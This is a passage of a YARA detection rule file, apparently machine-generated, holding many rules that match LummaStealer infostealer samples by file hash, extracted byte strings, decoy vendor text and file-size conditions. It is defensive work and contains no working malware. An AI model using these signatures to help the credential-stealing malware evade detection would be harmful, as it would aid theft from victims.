      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1f2bc57d77c1d929a63d990203962e773ad7cbea9ee25554682b18ebc007a7db"
   strings:
      $s1 = "xqnhvuag" fullword ascii /* score: '8.00'*/
      $s2 = "wfqzcutm" fullword ascii /* score: '8.00'*/
      $s3 = "<A,ZkXx /G" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__83ab0135 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_83ab0135.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "83ab01353d7be13e22109169d6430a32cd87446f464c7497c40eab31571c02d0"
   strings:
      $s1 = "* #m`-" fullword ascii /* score: '9.00'*/
      $s2 = "xfixgpdf" fullword ascii /* score: '8.00'*/
      $s3 = "yyoinrxe" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__de7f29cf {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_de7f29cf.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "de7f29cf62d9735cd9da592d1f976fd44bddf1a078c59d5a1a0a581e9904c592"
   strings:
      $s1 = "* #m`-" fullword ascii /* score: '9.00'*/
      $s2 = ">qU+ -" fullword ascii /* score: '9.00'*/
      $s3 = "yiynszxf" fullword ascii /* score: '8.00'*/
      $s4 = "mzbddjij" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__3fbc2156 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_3fbc2156.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3fbc215645b9b1f6b38cc7c4e3d0f0d216601d7f944b73f5809dc79b0f3e3f30"
   strings:
      $s1 = "-g$t@* /ELC" fullword ascii /* score: '9.00'*/
      $s2 = "* v<>ZHl" fullword ascii /* score: '9.00'*/
      $s3 = "]{<!+,24 " fullword ascii /* score: '9.00'*/ /* hex encoded string '$' */
      $s4 = "vUgeT/`" fullword ascii /* score: '9.00'*/
      $s5 = "dwhncpdq" fullword ascii /* score: '8.00'*/
      $s6 = "apzpxdyv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__a881925a {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_a881925a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a881925ab6bb6488d6c09ce176612eded9913dbc61c0f88fb1565a555f359012"
   strings:
      $s1 = "=+~)$+)23" fullword ascii /* score: '9.00'*/ /* hex encoded string '#' */
      $s2 = "qnaplirn" fullword ascii /* score: '8.00'*/
      $s3 = "hvghoebg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__6709ed22 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_6709ed22.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6709ed22e406bb3e1028b28cd8097fff270a3ebdde0bcec0129c8261f72139fc"
   strings:
      $s1 = "nikwicnc" fullword ascii /* score: '8.00'*/
      $s2 = "JQJv!." fullword ascii /* score: '8.00'*/
      $s3 = "ytwiogrd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__8f84a037 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_8f84a037.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8f84a0379c63512f33883ece73b0f3532d7bc3e06926c8f7ae391509270b8fcd"
   strings:
      $s1 = "i -n Su" fullword ascii /* score: '9.00'*/
      $s2 = "hRaT$]w" fullword ascii /* score: '9.00'*/
      $s3 = "aclrrqmb" fullword ascii /* score: '8.00'*/
      $s4 = "avkfelqo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__e8d3ec16 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_e8d3ec16.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e8d3ec1635f8099552083229aa4b6734e9fa270fe65be3284403fee1fb0922db"
   strings:
      $s1 = "Oi8vcGtpLWNybC5zeW1hdXRoLmNvbS9vZmZsaW5lY2EvVGhlSW5zdGl0dXRlb2ZF" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s2 = "bGVjdHJpY2FsYW5kRWxlY3Ryb25pY3NFbmdpbmVlcnNJbmNJRUVFUm9vdENBLmNy" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s3 = "* Ig_.A" fullword ascii /* score: '9.00'*/
      $s4 = "0XdLLx0F" fullword ascii /* score: '9.00'*/
      $s5 = "Y2FsIGFuZCBFbGVjdHJvbmljcyBFbmdpbmVlcnMsIEluYy4xDTALBgNVBAsTBElF" fullword ascii /* score: '9.00'*/
      $s6 = "KgI8WCsKbA0ZGeThc1GC7WN3kYdWRXtU2S+auJHMpA17DJMyNmsn7DAC2QKBgDb3" fullword ascii /* score: '9.00'*/
      $s7 = "NzAzMTAyMzU5NTlaMDIxEjAQBgNVBAMMCU9SX0syRDlLTzEcMBoGA1UECgwTT3Jl" fullword ascii /* score: '9.00'*/
      $s8 = "ahomrppg" fullword ascii /* score: '8.00'*/
      $s9 = "eskjngkc" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__db5fa0a0 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_db5fa0a0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "db5fa0a05c052e8298bb3df800a24b56647e800709bfd19a587f02ba00691649"
   strings:
      $s1 = "agekzipw" fullword ascii /* score: '8.00'*/
      $s2 = "jhuqtzu" fullword ascii /* score: '8.00'*/
      $s3 = "njokdoej" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__7476e2a3 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_7476e2a3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7476e2a32b09cfb78d05a1a237021d63db5317c1e708499d2467d80ff9b52b5b"
   strings:
      $s1 = "   <activeCodePage xmlns=\"http://schemas.microsoft.com/SMI/2019/WindowsSettings\">UTF-8</activeCodePage>" fullword ascii /* score: '12.00'*/
      $s2 = " <assemblyIdentity type=\"win32\" name=\"VBoxNetNAT.exe\" version=\"7.0.20.13906\"></assemblyIdentity>" fullword ascii /* score: '10.00'*/
      $s3 = "qAxhp:\"" fullword ascii /* score: '10.00'*/
      $s4 = "* t1|g" fullword ascii /* score: '9.00'*/
      $s5 = "ucnayahl" fullword ascii /* score: '8.00'*/
      $s6 = "wqK4xqKK%qKl%qKsvqKDyqK!|qK" fullword ascii /* score: '8.00'*/
      $s7 = "leadclqf" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__8f297acc {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_8f297acc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8f297acc5a4c98ca7f6c0cb2f1f8327a60819739bd7b78fcfffaddfbf21517f2"
   strings:
      $s1 = "   <activeCodePage xmlns=\"http://schemas.microsoft.com/SMI/2019/WindowsSettings\">UTF-8</activeCodePage>" fullword ascii /* score: '12.00'*/
      $s2 = " <assemblyIdentity type=\"win32\" name=\"VBoxNetNAT.exe\" version=\"7.0.20.13906\"></assemblyIdentity>" fullword ascii /* score: '10.00'*/
      $s3 = "#/]2->\"B" fullword ascii /* score: '9.00'*/ /* hex encoded string '+' */
      $s4 = "]qMiy -|" fullword ascii /* score: '8.00'*/
      $s5 = "ftwqhjib" fullword ascii /* score: '8.00'*/
      $s6 = "FEOxE* xEP XEQ#xEr xER XES" fullword ascii /* score: '8.00'*/
      $s7 = "aqrftwqf" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__97b252e5 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_97b252e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "97b252e5f69334d194b770cf4a5d6839e0538f2942dbeb88170190751bf72482"
   strings:
      $s1 = "   <activeCodePage xmlns=\"http://schemas.microsoft.com/SMI/2019/WindowsSettings\">UTF-8</activeCodePage>" fullword ascii /* score: '12.00'*/
      $s2 = " <assemblyIdentity type=\"win32\" name=\"VBoxNetNAT.exe\" version=\"7.0.20.13906\"></assemblyIdentity>" fullword ascii /* score: '10.00'*/
      $s3 = "* |DA%hh" fullword ascii /* score: '9.00'*/
      $s4 = "nuhzzoxz" fullword ascii /* score: '8.00'*/
      $s5 = "pizhymbs" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__f6f9759e {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_f6f9759e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f6f9759e408b5e2329e17e673e60dd8190c9031b073b35b042bc4e10280bfab1"
   strings:
      $s1 = "* {0 $52" fullword ascii /* score: '9.00'*/
      $s2 = "_ @3f\\$?" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s3 = "* 4}cG" fullword ascii /* score: '9.00'*/
      $s4 = "gtulnopr" fullword ascii /* score: '8.00'*/
      $s5 = "cvkrfhsj" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__8480d6f1 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_8480d6f1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8480d6f16e463ad3d1ca09c601db151400fcd7a112dcd43e7790fc0f1a945408"
   strings:
      $s1 = "nbtjmbcn" fullword ascii /* score: '8.00'*/
      $s2 = "ejavehub" fullword ascii /* score: '8.00'*/
      $s3 = "kvfjqql" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__9acfe802 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_9acfe802.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9acfe802385fed7fa23d9b8c2a916dda8836bc3fb9854873d605892acc3fc856"
   strings:
      $s1 = "faxctdde" fullword ascii /* score: '8.00'*/
      $s2 = "worzujpg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__bef66065 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_bef66065.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bef66065ae146b693b54b308c56f0aaef361bea69baf56dfe49c371a009df3aa"
   strings:
      $s1 = "   <activeCodePage xmlns=\"http://schemas.microsoft.com/SMI/2019/WindowsSettings\">UTF-8</activeCodePage>" fullword ascii /* score: '12.00'*/
      $s2 = " <assemblyIdentity type=\"win32\" name=\"VBoxNetNAT.exe\" version=\"7.0.20.13906\"></assemblyIdentity>" fullword ascii /* score: '10.00'*/
      $s3 = "yuiU:\\" fullword ascii /* score: '10.00'*/
      $s4 = "tLsW:\"" fullword ascii /* score: '10.00'*/
      $s5 = "`4\\3\\#\\" fullword ascii /* score: '9.00'*/ /* hex encoded string 'C' */
      $s6 = "xnwnwqiv" fullword ascii /* score: '8.00'*/
      $s7 = "yyejbcck" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__13f20829 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_13f20829.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "13f20829a62b48bb156974b56e5d7d7b39f6660ddbe9716b97ba9cac435617fe"
   strings:
      $s1 = "   <activeCodePage xmlns=\"http://schemas.microsoft.com/SMI/2019/WindowsSettings\">UTF-8</activeCodePage>" fullword ascii /* score: '12.00'*/
      $s2 = " <assemblyIdentity type=\"win32\" name=\"VBoxNetNAT.exe\" version=\"7.0.20.13906\"></assemblyIdentity>" fullword ascii /* score: '10.00'*/
      $s3 = "* (%W&" fullword ascii /* score: '9.00'*/
      $s4 = "BPXHY -" fullword ascii /* score: '8.00'*/
      $s5 = "kHEMsx}- " fullword ascii /* score: '8.00'*/
      $s6 = "bdahwshn" fullword ascii /* score: '8.00'*/
      $s7 = "yqtnvtwa" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__89107cb2 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_89107cb2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "89107cb2d7b07048708a1590a081840531ce78c1d21f75775de4ddb78bdd7967"
   strings:
      $s1 = "   <activeCodePage xmlns=\"http://schemas.microsoft.com/SMI/2019/WindowsSettings\">UTF-8</activeCodePage>" fullword ascii /* score: '12.00'*/
      $s2 = " <assemblyIdentity type=\"win32\" name=\"VBoxNetNAT.exe\" version=\"7.0.20.13906\"></assemblyIdentity>" fullword ascii /* score: '10.00'*/
      $s3 = "O26wRFI1.IsN" fullword ascii /* score: '10.00'*/
      $s4 = "#(-(2/!5|" fullword ascii /* score: '9.00'*/ /* hex encoded string '%' */
      $s5 = "otbwovvf" fullword ascii /* score: '8.00'*/
      $s6 = "jsjkkmpz" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__764e7923 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_764e7923.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "764e79231b71140fc165e9f480afe6d338a97061cf2ac9ac3d3c9dfe55a1a836"
   strings:
      $s1 = "ydwnbywz" fullword ascii /* score: '8.00'*/
      $s2 = "trkgrahu" fullword ascii /* score: '8.00'*/
      $s3 = "OQSR* #" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__c5e800da {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_c5e800da.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c5e800da0e1d523119de112aef349fb586d37e35a589be9f95e2bad81b6d8798"
   strings:
      $s1 = "eduyypdo" fullword ascii /* score: '8.00'*/
      $s2 = "ucvksvxw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__bbaf1656 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_bbaf1656.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bbaf1656d4aab10b3079c549138657d93e5191bcbf3b5fc72835d53a047b175c"
   strings:
      $s1 = "USER32.dql" fullword ascii /* score: '13.00'*/
      $s2 = "5'\\d\\[," fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s3 = "mfiatyzm" fullword ascii /* score: '8.00'*/
      $s4 = "elnzelm" fullword ascii /* score: '8.00'*/
      $s5 = "ayvvzdfn" fullword ascii /* score: '8.00'*/
      $s6 = "elhoelo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__dca99af2 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_dca99af2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dca99af22ed2f63573268ac0c62424d9c7644ec7f6f54bce20f4bfebbef01edf"
   strings:
      $s1 = "USER32.dql" fullword ascii /* score: '13.00'*/
      $s2 = "zsPYL83" fullword ascii /* score: '10.00'*/
      $s3 = "sdnermcj" fullword ascii /* score: '8.00'*/
      $s4 = "xmwxcpbz" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__27d39dc2 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_27d39dc2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "27d39dc24dabb7ba6199fb3cc3f2eb785fd202d7f11010e4e5b16de1ffbab4b2"
   strings:
      $s1 = "cpcsebuc" fullword ascii /* score: '8.00'*/
      $s2 = "upzhhwdi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__31ef4608 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_31ef4608.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "31ef4608db0154dcddaacdfeff8c073048328ee5f0e237aefd8a8695f582183f"
   strings:
      $s1 = "MTgIrc'+h" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__83378543 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_83378543.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "83378543ce52ab818b5b8f2aa1c840ad41c0fbc0be410a24d8147b07d5f3c346"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "XsgG.Osy" fullword ascii /* score: '10.00'*/
      $s4 = "wwwwwwwgpww" fullword ascii /* score: '8.00'*/
      $s5 = "IBDr* !;" fullword ascii /* score: '8.00'*/
      $s6 = "/5#n!8%i%M4" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 25000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__f57829fc {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_f57829fc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f57829fccab2aa91f23ab2a8779fc7aa93bf5eabd1010bb3479580989f6bce45"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v5.79.1-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s4 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s5 = "74^ |\"3f" fullword ascii /* score: '9.00'*/ /* hex encoded string 't?' */
      $s6 = "e /v:G" fullword ascii /* score: '9.00'*/
      $s7 = "JnO^EWEUESEQE[EYE]E" fullword ascii /* score: '9.00'*/
      $s8 = "qmooxjf" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__9190af1c {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_9190af1c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9190af1c1e709da8949a355c9ea9c8e545640da65da4a6ee8e93ad7d036eb856"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v6.12.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "'&%%4+++=-,,?)));$##3" fullword ascii /* score: '9.00'*/ /* hex encoded string 'C' */
   condition:
      uint16(0) == 0x5a4d and filesize < 31000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__c90f0bbd {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_c90f0bbd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c90f0bbdfe76af8f5a6fec2cf92599db3f9a25df83af4ad46b46c51d23d31faa"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = " EcoLogistics Solutions Inc. 2020 All rights reserved." fullword wide /* score: '9.00'*/
      $s4 = "EcoRoute is a trademark of EcoLogistics Solutions Inc." fullword wide /* score: '9.00'*/
      $s5 = "EcoLogistics Solutions Inc." fullword wide /* score: '9.00'*/
      $s6 = "tNlEg* \\" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__ea99f962 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_ea99f962.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ea99f962525094d90f6395433e936f8f583827d5da601e5300c0e8757df3c544"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v4.75.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s4 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b23cc2f34c8f7e1a22cdf0f663e68f6ab45ef9b957e01f828a519b7b282eeef"
   strings:
      $s1 = "equestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns" ascii /* score: '26.00'*/
      $s2 = " Install System v2.46-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges>" ascii /* score: '16.00'*/
      $s3 = " protection. SecureNet Dynamics PantherNetic Comprehensive cybersecurity protection. SecureNet Dynamics PantherNetic Comprehensi" ascii /* score: '9.00'*/
      $s4 = "prehensive cybersecurity protection. SecureNet Dynamics PantherNetic Comprehensive cybersecurity protection. Secur" fullword ascii /* score: '9.00'*/
      $s5 = "ureNet Dynamics PantherNetic Comprehensive cybersecurity protection. SecureNet Dynamics PantherNetic Comprehensive cybersecurity" ascii /* score: '9.00'*/
      $s6 = "PantherNetic Comprehensive cybersecurity protection. SecureNet Dynamics PantherNetic Comprehensive cybersecurity protection. Sec" ascii /* score: '9.00'*/
      $s7 = "ynamics PantherNetic Comprehensive cybersecurity protection. SecureNet Dynamics PantherNetic Comprehensive cybersecurity protect" ascii /* score: '9.00'*/
      $s8 = "PantherNetic Comprehensive cybersecurity protection. SecureNet Dynamics PantherNetic Comprehensive cybersecurity protection. Sec" ascii /* score: '9.00'*/
      $s9 = "etic Comprehensive cybersecurity protection. SecureNet Dynamics PantherNetic Comprehensive cybersecurity protection. SecureNet D" ascii /* score: '9.00'*/
      $s10 = "ve cybersecurity protection. SecureNet Dynamics PantherNetic Comprehensive cybersecurity protection. SecureNet Dynamics PantherN" ascii /* score: '9.00'*/
      $s11 = "ion. SecureNet Dynamics PantherNetic Comprehensive cybersecurity protection. SecureNet Dynamics PantherNetic Comprehensive cyber" ascii /* score: '9.00'*/
      $s12 = "prehensive cybersecurity protection. SecureNet Dynamics PantherNetic Comprehensive cybersecurity protection. SecureNet Dynamics " ascii /* score: '9.00'*/
      $s13 = "security protection. SecureNet Dynamics PantherNetic Comprehensive cybersecurity protection. SecureNet Dynamics PantherNetic Com" ascii /* score: '9.00'*/
      $s14 = "%SEfQi* " fullword ascii /* score: '8.00'*/
      $s15 = "GwJg -uyj\\" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 25000KB and
      8 of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__e4712909 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_e4712909.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e4712909e4e35fb83900083aa057d72acb87f5d967d0f6a8db6b2a0a0c37ba63"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.46.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s4 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s5 = "pKdP * " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__c32ba42c73a2bc24d2788f7750d87edb_imphash__6023632f {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c32ba42c73a2bc24d2788f7750d87edb(imphash)_6023632f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
